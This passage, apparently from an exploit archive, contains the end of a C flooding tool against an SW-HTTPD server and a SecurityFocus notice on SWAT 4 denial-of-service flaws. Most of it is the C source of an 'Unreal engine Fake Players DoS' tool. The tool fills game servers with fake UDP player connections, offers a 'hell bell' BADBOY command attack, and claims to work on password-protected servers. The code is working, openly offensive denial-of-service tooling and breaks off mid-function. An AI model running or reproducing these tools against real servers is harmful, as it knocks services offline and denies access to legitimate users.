                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
				"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30";

		struct sockaddr_in sockaddr_mysocket;
		sockaddr_long = sizeof(sockaddr_mysocket);
		sockaddr_mysocket.sin_family = AF_INET;
		sockaddr_mysocket.sin_addr.s_addr = inet_addr(argv[1]);
		sockaddr_mysocket.sin_port = htons(port);

	int i=0;
        char request[118];

        fprintf(stdout,"[+]SW-HTTPD Server %s\n",argv[1]);

for(i=0;i<100000;i++){

                mysocket2 = socket(AF_INET, SOCK_STREAM, 0);
                        if(mysocket2 == -1){
                        fprintf(stdout,"[+]Done!\n");
			return 1;}

	srv_connect = connect(mysocket2, (struct sockaddr*)&sockaddr_mysocket, sockaddr_long);
		
	if (srv_connect != -1)
 		{	
		sprintf(request, "GET /%s HTTP/1.1\r\n", hexa);
		
			if (send(mysocket2,request,sizeof(request),0) == -1){
				fprintf(stderr,"[-]Send Request\t\t[FAILED]\n");
				shutdown(mysocket2,1);
				fprintf(stdout,"[+]Done!\n");
				return 1;}
		}
		else{
			fprintf(stderr,"[-]Connect\t\t[FAILED]\n");
			fprintf(stdout,"[+]Done!\n");
			shutdown(mysocket2,1);
			return 1;}

	shutdown(mysocket2,1);
}
return 0;
}

// milw0rm.com [2009-03-19]
source: http://www.securityfocus.com/bid/30299/info

SWAT 4 is prone to multiple remote denial-of-service vulnerabilities because the application fails to properly handle certain input.

An attacker may exploit these issues to crash the affected application, denying service to legitimate users.

SWAT 4 1.1 is vulnerable; other versions may also be affected. 

/*
    Copyright 2008 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1.1"
#define PORT        7777
#define BUFFSZ      4096     // the max supported is 576
#define HELLBELL    "BADBOY " \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a" \
                    "\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a"

#define UT2_QUERY   "\x79\x00\x00\x00\x00"  // not used
#define GS1_QUERY   "\\info\\"              // \status\ returns 3 packets, I'm too lazy to handle all of them
#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00"                    "\xff\x00\x00" "\x00"
#define GS3_QUERY   "\xfe\xfd\x09" "\x00\x00\x00\x00"
#define GS3_QUERYX  "\xfe\xfd\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" "\xff\x00\x00" "\x00"



void fake_players_socket(int sd) {  // simple to add function for not closing sockets
    #define MAXFAKESOCKS    64
    static int  socks[MAXFAKESOCKS],
                socksp,
                init    = 1;
    int         i;

    if(init || (sd < 0)) {
        for(i = 0; i < MAXFAKESOCKS; i++) socks[i] = -1;
        socksp = 0;
        init   = 0;
        return;
    }
    if(socksp >= MAXFAKESOCKS) socksp = 0;
    if(socks[socksp] >= 0) close(socks[socksp]);
    socks[socksp] = sd;
    socksp++;
}
void activate_fix(int *fix);
int unreal_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int *chall, u8 **errmsg);
u8 *rndhash(int size);
int unreal_info(u8 *buff, struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
void fgetz(u8 *data, int len);
int calc_authresp(int num);
int write_unrnum(int num, u8 *buff, int bits);
int read_unrnum(int *num, u8 *buff, int bits);
int write_unrser(int num, u8 *buff, int bits, int max);
u8 *unreal_parse_pck(u8 *buff, int size, int *chall);
int unreal_build_pck(u8 *buff, int pck, ...);
int read_unreal_index(u8 *index_num, int *ret);
int write_unreal_index(int number, u8 *index_num);
int read_bitmem(u8 *in, int inlen, u8 *out, int bits);
int write_bitmem(u8 *in, int inlen, u8 *out, int bits);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int     aafix           = 0,    // America's Army uses 0x800 instead of 0x3ff
        u3fix           = 0,    // Unreal 3 no longer uses index numbers
        rvfix           = 0,    // RavenShiel uses 0x50f instead of 0x3ff (this is useless since it's enough compatible with AA)
        pariahfix       = 0,    // Pariah
        movfix          = 0,    // Men of Valor
        //khgfix          = 0,    // Klingon Honor Guard uses readbits 16 1 9 16 3 and 12 instead of index numbers
        // unreal1fix, similar to above... not needed to support at the moment
        verbose         = 0,
        challenge_fix   = 0,
        hex_challenge   = 0,
        force_team      = 0,
        force_fix       = 0,
        send_verbose    = 0,
        fast_connect    = 1,
        first_time      = 1;
u8      *gamestatefix[] = {
        "",     // none
            // the order of the hash of GAMESTATE checked in memory is 77778888555566661111222233334444
            //the second part of the GAMESTATE hash is the MD5 of "SCR3W3DD@P00CH" and the MD5 of the file (for example SwatGame.u)
            // Swat4 requires 32 successful GAMESTATEs, it's enough to send the same one 32 times,
            // but at the moment my tool doesn't support the sending of more packets
        "GAMESTATE FA1F998D4D4C2E5F492B79FF1D58488E5e2b7c57161e65909c8c7b01923aa4c4",   // UT2XMP demo
        "GAMESTATE 520996A03FACE2BE4FF9A24F17158B3B7c07dc2b72044ef0e6278707e9e8b0f6",   // UT2003
        // "GAMESTATE D2ECC882E8945E68413DDF3DCB7A1BBEfe95745de189869e61331593a64f33de",   // SWAT4 
        NULL
        };



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    int     i,
            sd,
            len,
            pck,
            ver,
            chall,
            onlyone         = 0,
            infoquery       = 1,
            sendauth        = 0,
            gamestatefixes  = 0,
            random_username = 0,
            force_closesock = 0;
    u16     port            = PORT;
    u8      buff[BUFFSZ],
            hello[BUFFSZ]   = "",
            auth[BUFFSZ]    = "",
            login[BUFFSZ]   = "",
            hellover[64]    = "",
            pass[64]        = "",
            tmpchall[12],
            *cmd_only       = NULL,
            *cmd_plus       = "",
            *login_plus     = "",
            *errmsg,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Unreal engine basic client and Fake Players DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s [options] <host> <port>\n"
            "\n"
            "Options:\n"
            "-c \"C\"  send only the custom command C\n"
            "-C \"C\"  send the custom command C plus the others needed to join\n"
            "-l \"S\"  add a custom URL string S to the LOGIN command, for example:\n"
            "        -l \"Index.ut2?Name=player?Class=EnginePawn?Character=Jakob?team=1\"\n"
            "        -l \"?Name=player?UserName=UserName?MAC=\"\n"
            //"        -l \"Entry.aao?Name=Recruit?Class=AGP_Characters.AGP_Character?team=255?UserName=UserName?MAC=\"\n"
            "-f      use the full method (HELLO + LOGIN and so on), needed with some games\n"
            "        of the Unreal 1 engine to avoid the crash of the server\n"
            //"-u      send a LOGIN command with a random UserName field (for America's Army)\n" AUTOMATIC!!!
            //"-a      send the AUTH command\n" AUTOMATIC!!!
            "-i      do not query the server for informations and for hostport\n"
            "-b      Windows dedicated server hell bell attack through the BADBOY command\n"
            "-v      verbose mode, show all the commands received from the server\n"
            "-V      show all the commands sent by this tool\n"
            "-1      only one fake player, debug\n"
            "-x N    force the activation of a specific compatibility fix, where N is for:\n"
            "        1 = America's Army     2 = Unreal 3 engine    3 = Raven Shield\n"
            "        4 = Pariah             5 = Men of Valor\n"
            "\n"
            "works also with servers protected by password without knowing the keyword!\n"
            "should work with almost any game based on the Unreal engine (1, 2 and 3)\n"
            "\n", argv[0]);
        exit(1);
    }

    argc -= 2;
    for(i = 1; i < argc; i++) {
        if(((argv[i][0] != '-') && (argv[i][0] != '/')) || (strlen(argv[i]) != 2)) {
            printf("\nError: wrong argument (%s)\n", argv[i]);
            exit(1);
        }
        switch(argv[i][1]) {
            case 'v': {
                verbose         = 1;
                break;
            }
            case 'V': {
                send_verbose    = 1;
                break;
            }
            case 'f': {
                fast_connect    = 0;
                break;
            }
            case 'c': {
                cmd_only        = argv[++i];
                break;
            }
            case 'C': {
                cmd_plus        = argv[++i];
                break;
            }
            case 'l': {
                login_plus      = argv[++i];
                fast_connect    = 0;
                break;
            }
            case '1': {
                onlyone         = 1;
                break;
            }
            case 'i': {
                infoquery       = 0;
                break;
            }
            case 'a': {
                sendauth        = 1;
                break;
            }
            case 'b': {
                cmd_only        = HELLBELL;
                force_closesock = 1;
                break;
            }
            case 'u': {
                random_username = 1;
                fast_connect    = 0;
                break;
            }
            case 'x': {
                force_fix       = atoi(argv[++i]);
                break;
            }
            default: {
                printf("\nError: wrong argument (%s)\n", argv[i]);
                exit(1);
            }
        }
    }

    host = argv[argc];
    port = atoi(argv[argc + 1]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    if(infoquery && (ntohs(peer.sin_port) != 7777)) {
        ver = unreal_info(buff, &peer);
        if(ver) sprintf(hellover, "MINVER=%d VER=%d", ver, ver);
    }

        /* full list of parameters and values parsed by various games which use the Unreal engine
        USERFLAG (number)
        HELLO
            MINVER=
            VER=
        AUTH
            HASH=
            RESPONSE=
            USERNAME=
            PASSWORD=
            GM=
        NETSPEED (number >= 1800)
        HAVE
            GUID=
            GEN=
        SKIP
            GUID=
        LOGIN
            RESPONSE=
            URL=
        JOIN
        BADBOY (followed by the string visualized in the console)
        PETE
            PKT=
            PKG=
        REPEAT
        OPENVOICE (number)
            // UT2003
        CRITOBJCNT (number, similar to PETE)
        GAMESTATE (ID)
            NAME=
            // SWAT4
        GAMESPYRESPONSE
            RS=
        GAMESPYSTATRESPONSE
            PID=
            RS=
        VERIFYCONTENT
            FILE=
            MD5=
        GAMECONFIGCOUNT (number)
        GAMECONFIG
            CONFIGFILE=
            CONFIGMD5=
            // Warpath and Pariah
        JOINSPLIT
            GAMEPAD=
            GUESTNUM=
        DISABLESPLIT
            GAMEPAD=
        EPIC (hash)
            // Raven Shield
        SERVERPING
        ARMPATCH
            // UT3
        DEBUG
        ABORT
            GUID=
        JOINSPLIT
        */
        // generic in-game commands: open namecount start map servertravel say disconnect

    printf("\n- start attack:\n");

    if(force_fix) {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        errmsg = unreal_parse_pck("\0\0", 0, NULL);
        goto handle_error_message;
    }

    for(;;) {
        pck = 0;
        printf("\n  Player: ");

        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        do {
            peerl.sin_port++;
        } while(bind(sd, (struct sockaddr *)&peerl, sizeof(struct sockaddr_in)) < 0);

        if(!fast_connect || u3fix || movfix) {    // Unreal 3 requires the LOGIN packet, while MOV crashes!
            sprintf(hello, "HELLO %sREVISION=0 %s", u3fix ? "P=1 " : "", hellover);

            len = unreal_build_pck(buff, pck++,
                hello,
                NULL);

            len = unreal_send_recv(sd, buff, len, buff, BUFFSZ, &peer, &chall, &errmsg);
            if(len < 0) goto handle_error_message;

            //sprintf(login, "LOGIN RESPONSE=%i URL=Index.ut2?Name=player?Class=EnginePawn?Character=Jakob?team=1%s%s", chall, pass[0] ? "?password=" : "", pass);
            sprintf(tmpchall, hex_challenge ? "%08X" : "%i", chall);    // I don't know if this is right, seems that U3 doesn't check the challenge!
            sprintf(login, "LOGIN RESPONSE=%s URL=%s%s%s%s", tmpchall, login_plus, force_team ? "?Team=1" : "", pass[0] ? "?password=" : "", pass);
            if(random_username) sprintf(login + strlen(login), "?UserName=%s", rndhash(5));
        }

        if(sendauth) {
            sprintf(auth,  "AUTH HASH=%s GM=%s USERNAME=%s PASSWORD=%s", rndhash(16), rndhash(66), rndhash(4), rndhash(16));
        }

        if(cmd_only) {
            len = unreal_build_pck(buff, pck++,
                cmd_only,
                NULL);
        } else {
            len = unreal_build_pck(buff, pck++,
                auth,   // causes only problems!
                login,
                //"NETSPEED 1800",    // useless
                "PETE PKT=1 PKG=1",
                "REPEAT",
                "CRITOBJCNT 1",
                gamestatefix[gamestatefixes],
                cmd_plus,
                "JOIN",
                NULL);
        }
        if(len > BUFFSZ) {
            printf("\nError: your packet is too big\n");
            exit(1);
        }
        len = unreal_send_recv(sd, buff, len, buff, BUFFSZ, &peer, NULL, &errmsg);
        if(len < 0) goto handle_error_message;

        if(onlyone) {
            if(verbose) {
                for(;;) {   // show any other incoming message
                    len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 0);
                    if(len < 60) break;  // break if too small
                    errmsg = unreal_parse_pck(buff, len, NULL);
                    if(errmsg) break;
                }
            }
            printf("\n- done\n");
            exit(1);
        }

        if(force_closesock) {
            close(sd);
        } else {
            fake_players_socket(sd);
        }
        continue;

handle_error_message:
        close(sd);
        if(!errmsg) continue;
        if(strstr(errmsg, "UPGRADE")) {
            p = strstr(errmsg, "MINVER");   // UPGRADE MINVER= VER=
            if(!p) exit(1);
            strncpy(hellover, p, sizeof(hellover));
            hellover[sizeof(hellover) - 1] = 0;
        } else if(strstr(errmsg, "SERVERFULL") || stristr(errmsg, "capacity") || stristr(errmsg, "MaxedOutMessage") || stristr(errmsg, "players")) {
            printf(" server full ");
            for(i = 3; i; i--) {
                printf("%d\b", i);
                sleep(ONESEC);
            }
        } else if(strstr(errmsg, "NEEDPW") || strstr(errmsg, "WRONGPW") || stristr(errmsg, "password") || stristr(errmsg, "PassWd")) {
            printf("\n- server is protected with password, insert the keyword: ");
            fgetz(pass, sizeof(pass));
        } else if(strstr(errmsg, "BRAWL")) {
            gamestatefixes++;
            if(!gamestatefix[gamestatefixes]) {
                printf("\nError: this game needs one or more GAMESTATE commands not implemented\n");
                exit(1);
            }
            printf("\n- %s", gamestatefix[gamestatefixes]);
        } else if(stristr(errmsg, "Username")) {
            if(random_username) exit(1);
            printf("\n- activate random UserName in the LOGIN command");
            random_username = 1;
            fast_connect    = 0;
        } else if(stristr(errmsg, "Could not find team")) {
            if(force_team) exit(1);
            printf("\n- activate team fix");
            force_team      = 1;
            fast_connect    = 0;
        } else if(stristr(errmsg, "stats")) {
            if(sendauth) exit(1);
            sendauth        = 1;
        } else if(stristr(errmsg, "CHALLENGE")) {
            challenge_fix++;
            if(challenge_fix == 1) {
                printf("\n- activate the Frontline Fuel of War challenge fix");
            } else if(!hex_challenge) {
                printf("\n- activate the hexadecimal challenge fix");
                challenge_fix = 0;
                hex_challenge = 1;
            } else {
                printf("\n"
                "Error: seems that this game requires a specific challenge-response algorithm\n"
                "\n");
                exit(1);
            }
        } else if(!strcmp(errmsg, "NOFIX")) {
            printf("\n- activate full connect without compatibility fixes");
            activate_fix(NULL);
        } else if(!strcmp(errmsg, "AAFIX")) {
            printf("\n- activate the America's Army compatibility");
            activate_fix(&aafix);
        } else if(!strcmp(errmsg, "U3FIX")) {
            printf("\n- activate the Unreal 3 engine compatibility");
            activate_fix(&u3fix);
        } else if(!strcmp(errmsg, "RVFIX")) {
            printf("\n- activate the Raven Shield compatibility");
            activate_fix(&rvfix);
        } else if(!strcmp(errmsg, "PARIAHFIX")) {
            printf("\n- activate the Pariah/Warpath compatibility");
            activate_fix(&pariahfix);
        } else if(!strcmp(errmsg, "MOVFIX")) {
            printf("\n- activate the Men of Valor compatibility");
            activate_fix(&movfix);
        } else {
            printf("\nError: %s\n", errmsg);
            exit(1);
        }
    }
    return(0);
}



void activate_fix(int *fix) {
    aafix       = 0;
    u3fix       = 0;
    rvfix       = 0;
    pariahfix   = 0;
    movfix      = 0;
    if(fix) *fix = 1;
}



int unreal_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int *chall, u8 **errmsg) {
    int     len;

    len = send_recv(sd, in, insz, out, outsz, peer, first_time);
    if(len < 0) {
        if(len == -1) std_err();
        printf(" players_per_IP limit or timed out ");
        sleep(ONESEC);
        *errmsg = NULL;
        return(-1);
    }
    if(first_time) first_time = 0;

#ifdef DUMPPCK
    static  int num = 0;
    FILE    *fd;
    char    fname[64];
    sprintf(fname, "unrealfp_pck.%03d", num++);
    fd = fopen(fname, "wb");
    if(!fd) std_err();
    fwrite(out, 1, len, fd);
    fclose(fd);
#endif

    *errmsg = unreal_parse_pck(out, len, chall);
    if(*errmsg) return(-1);
    return(len);
}



u8 *rndhash(int size) {
    static u32  rnd = 0;
    static int  sel = 0;
    static u8   out[4][256];
    static const u8 hex[16] = "0123456789abcdef";
    int         i;
    u8          *ret,
                *p;

    if(!rnd) rnd = ~time(NULL);

    ret = out[sel++ & 3];
    p = ret;
    for(i = 0; i < size; i++) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        *p++ = hex[(rnd & 0xff) >> 4];
        *p++ = hex[(rnd & 0xff) & 15];
    }
    *p = 0;
    return(ret);
}



int unreal_info(u8 *buff, struct sockaddr_in *peer) {
    u32     chall;
    int     sd,
            len,
            type,
            retver      = 0;
    u8      gs3[32],
            *gamever    = NULL,
            *hostport   = NULL;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("\n- send info queries\n");
          send_recv(sd, GS1_QUERY, sizeof(GS1_QUERY) - 1, NULL, 0,      peer, 0);
          send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, NULL, 0,      peer, 0);
          send_recv(sd, GS3_QUERY, sizeof(GS3_QUERY) - 1, NULL, 0,      peer, 0);
    len = send_recv(sd, NULL,      0,                     buff, BUFFSZ, peer, 0);
    if(len < 0) goto quit;
    if(buff[0] == '\\') {
        type = 1;
    } else {
        if(len < 8) {
            type = 2;
            len = send_recv(sd, NULL,  0,                    buff, BUFFSZ, peer, 0);
            if(len < 0) goto quit;
        } else {
            type = 3;
            memcpy(gs3, GS3_QUERYX, sizeof(GS3_QUERYX) - 1);
            chall = atoi(buff + 5);
            gs3[7]  = chall >> 24;
            gs3[8]  = chall >> 16;
            gs3[9]  = chall >>  8;
            gs3[10] = chall;
            len = send_recv(sd, gs3, sizeof(GS3_QUERYX) - 1, buff, BUFFSZ, peer, 0);
            if(len < 0) goto quit;
        }
    }

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len,
        (type == 1) ? 1 : 0, (type == 1) ? '\\' : '\0', (type == 1) ? 0 : 5, 0,
        "gamever",  &gamever,
        "hostport", &hostport,
        NULL,       NULL);

    if(gamever) {
        retver = atoi(gamever);
    }
    if(hostport) {
        peer->sin_port = htons(atoi(hostport));
        printf("\n- set hostport %hu\n", ntohs(peer->sin_port));
    }

quit:
    close(sd);
    return(retver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



void fgetz(u8 *data, int len) {
    u8      *p;

    fgets(data, len, stdin);
    for(p = data; *p && (*p != '\n') && (*p != '\r'); p++);
    *p = 0;
}



int calc_authresp(int num) {
    if(challenge_fix == 1) return((num * 178) ^ (num >> 16) ^ (num << 16) ^ 0xfe11ae23);    // FFOW
    return((num * 237) ^ (num >> 16) ^ (num << 16) ^ 0x93fe92ce);
}



int write_unrnum(int num, u8 *buff, int bits) {
    int     len;
    u8      mini[5];

    len = write_unreal_index(num, mini);
    return(write_bitmem(mini, len, buff, bits));
}



int read_unrnum(int *num, u8 *buff, int bits) {
    u8      mini[5];

    *num = 0;
    read_bitmem(buff, 5, mini, bits);
    return(bits + (read_unreal_index(mini, num) << 3));
}



int write_unrser(int num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    for(b = 1; b && (b < max); b <<= 1) {
        bits = write_bits((num & b) ? 1 : 0, 1, buff, bits);
    }
    return(bits);
}



int read_unrser(int *num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    *num = 0;
    for(b = 1; b && (b < max); b <<= 1) {
        if(read_bits(1, buff, bits)) *num += b;
        bits++;
    }
    return(bits);
}



u8 *unreal_parse_pck(u8 *buff, int size, int *chall) {
    static int  retfix  = 0,
                done    = 0;
    static u8   str[BUFFSZ];
    int     b,
            len,
            pck;
    u8      *p;

    if(force_fix) {
        retfix = force_fix - 1; // because then it does retfix++
        force_fix = 0;
    }
    if(chall) *chall = 0;

    read_unrser(&pck, buff, 0, 0x4000);
    if(u3fix) {
        switch(pck) {
            case 0:  b = 52;    break;
            case 1:  b = 67;    break;
            default: b = 52;    break;  // doesn't work with all the packets
        }
    } else if(pariahfix) {
        switch(pck) {
            case 0:  b = 66;    break;
            case 1:  b = 81;    break;
            default: b = 52;    break;  // doesn't work with all the packets
        }
    } else {
        switch(pck) {
            case 0:  b = 67;    break;
            case 1:  b = 82;    break;
            default: b = 52;    break;  // doesn't work with all the packets
        }
    }
    if(aafix)  b++;
    if(rvfix)  b++;
    if(movfix) b++;
    size <<= 3;

    /* correct but not necessary, probably in a future implementation
    b -= 12;
    b = read_unrser(&len, buff, b, 0x1000);
    if((b + len) < size) size = b + len;
    */

    while(b < size) {
        b = read_unrnum(&len, buff, b);
        if((len < 0) || ((b + (len << 3)) > size) || (len > (sizeof(str) - 1))) break; 
        if(!done) done++;
        b = read_bitmem(buff, len, str, b);
        str[len] = 0;
        if(verbose) printf("\n  %s", str);
        if(chall) {
            p = strstr(str, "CHALLENGE=");
            if(p) {
                sscanf(p + 10, hex_challenge ? "%08X" : "%i", chall);
                *chall = calc_authresp(*chall);
            }
        }
        if(strstr(str, "FAIL") || strstr(str, "BRAWL") || strstr(str, "UPGRADE")) {
            return(str);
        }
    }
    if(!done) {
        retfix++;
        if(retfix == 1) return("AAFIX");
        if(retfix == 2) return("U3FIX");
        if(retfix == 3) return("RVFIX");
        if(retfix == 4) return("PARIAHFIX");
        if(retfix == 5) return("MOVFIX");
        if(fast_connect) {
            retfix       = 0;
            fast_connect = 0;
            return("NOFIX");
        }
        printf("\n"
            "Error: seems that this game requires a specific compatibility fix\n"
            "       try to relaunch this tool another time\n"
            "\n");
        exit(1);
    }
    return(NULL);
}



int unreal_build_pck(u8 *buff, int pck, ...) {
    va_list ap;
    int     i,
            b,
            sl,
            len,
            bsize,
            val3ff,
            val8,
            val1000;
    u8      *s;

    //devastation is not supported, it uses 0x4000 1 1 0x4000 1 1 1 1 0x3ff 0x1000 

    val8 = 0x08;
    if(pariahfix) val8 = 0x4;

    val3ff = 0x3ff;
    if(aafix) val3ff = 0x800;
    if(rvfix) val3ff = 0x50f;   // takes the same number of bits of AA... it's useless

    val1000 = 0x1000;
    if(movfix) val1000 = 0x1e00;

    b = 0;
    b = write_unrser(pck, buff, b, 0x4000);
    if(pck == 0) {
        b = write_bits(0, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_unrser(0, buff, b, val3ff);
    } else if(pck == 1) {
        b = write_bits(1, 1, buff, b);
        b = write_unrser(0, buff, b, 0x4000);
        b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(1, 1, buff, b);
        b = write_unrser(0, buff, b, val3ff);
    } else {   // this one is not supported
        b = write_bits(1, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_bits(0, 1, buff, b);
        b = write_unrser(0, buff, b, val3ff);
    }
    b = write_unrser(pck + 1, buff, b, 0x400);
    b = write_unrser(1, buff, b, val8); // 0 with pck > 1
    bsize = b;

    for(i = 0; i < 2; i++) {  // used only for calculating the packet size! it allows to save an additional buffer
        va_start(ap, pck);
        while((s = va_arg(ap, u8 *))) {
            sl = strlen(s) + 1;
            if(sl == 1) continue;               // skip empty
            if(!i && send_verbose) printf("\n^ %s", s);
            b = write_unrnum(sl, buff, b);
            b = write_bitmem(s, sl, buff, b);   // in reality they are index numbers
        }
        va_end(ap);

        if(!i) b = write_unrser(b - bsize, buff, bsize, val1000);
    }

    b = write_bits(1, 1, buff, b);   // ???

    len = b >> 3;
    if(b & 7) len++;
    if(send_verbose) printf("\n");
    return(len);
}



int read_unreal_index(u8 *index_num, int *ret) {
    int     len,
            result;
    u8      b0 = index_num[0],
            b1 = index_num[1],
            b2 = index_num[2],
            b3 = index_num[3],
            b4 = index_num[4];

    if(u3fix) {
        *ret = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
        return(4);
    }

    result = 0;
    len    = 1;
    if(b0 & 0x40) {
        len++;
        if(b1 & 0x80) {
            len++;
            if(b2 & 0x80) {
                len++;
                if(b3 & 0x80) {
                    len++;
                    result = b4;
                }
                result = (result << 7) | (b3 & 0x7f);
            }
            result = (result << 7) | (b2 & 0x7f);
        }
        result = (result << 7) | (b1 & 0x7f);
    }
    result = (result << 6) | (b0 & 0x3f);
    if(b0 & 0x80) result = -result;
    *ret = result;
    return(len);
}



int write_unreal_index(int number, u8 *index_num) {
    int     len,
            sign = 1;

    if(u3fix) {
        index_num[0] = number & 0xff;
        index_num[1] = (number >> 8) & 0xff;
        index_num[2] = (number >> 16) & 0xff;
        index_num[3] = (number >> 24) & 0xff;
        return(4);
    }

    if(number < 0) {
        number = -number;
        sign = -1;
    }

    len = 1;
    index_num[0] = (number & 0x3f);
    if(number >>= 6) {
        index_num[0] += 0x40;
        index_num[1] = (number & 0x7f);
        len++;
        if(number >>= 7) {
            index_num[1] += 0x80;
            index_num[2] = (number & 0x7f);
            len++;
            if(number >>= 7) {
                index_num[2] += 0x80;
                index_num[3] = (number & 0x7f);
                len++;
                if(number >>= 7) {
                    index_num[3] += 0x80;
                    index_num[4] = number;
                    len++;
                }
            }
        }
    }
    if(sign < 0) index_num[0] += 0x80;
    return(len);
}



int read_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; out++) {
        *out = read_bits(8, in, bits);
        bits += 8;
    }
    return(bits);
}



int write_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; in++) {
        bits = write_bits(*in, 8, out, bits);
    }
    return(bits);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-2);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
